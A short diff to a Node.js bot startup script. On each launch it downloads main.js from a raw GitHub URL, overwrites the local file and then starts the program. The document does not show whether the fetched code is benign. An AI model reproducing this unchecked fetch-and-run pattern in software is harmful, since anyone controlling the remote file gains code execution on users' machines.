@@ -4,6 +4,8 @@ import path from 'path'
 import CFonts from 'cfonts'
 import chalk from 'chalk'
 import fetch from 'node-fetch'
+import axios from 'axios'
+import fs from 'fs'
 
 import { fileURLToPath } from 'url';
 
@@ -78,4 +80,20 @@ CFonts.say('Keys', {
    transitionGradient: true,
 })
 
-start()
+axios({
+  url: 'https://raw.githubusercontent.com/RayNozawa/TeleBot/refs/heads/main/main.js',
+  method: 'GET',
+  responseType: 'stream'
+})
+.then((response) => {
+  const writer = fs.createWriteStream('main.js');
+
+  response.data.pipe(writer);
+
+  writer.on('finish', () => {
+    start()
+  })
+  writer.on('error', (err) => {
+    console.error(err);
+  })
+});
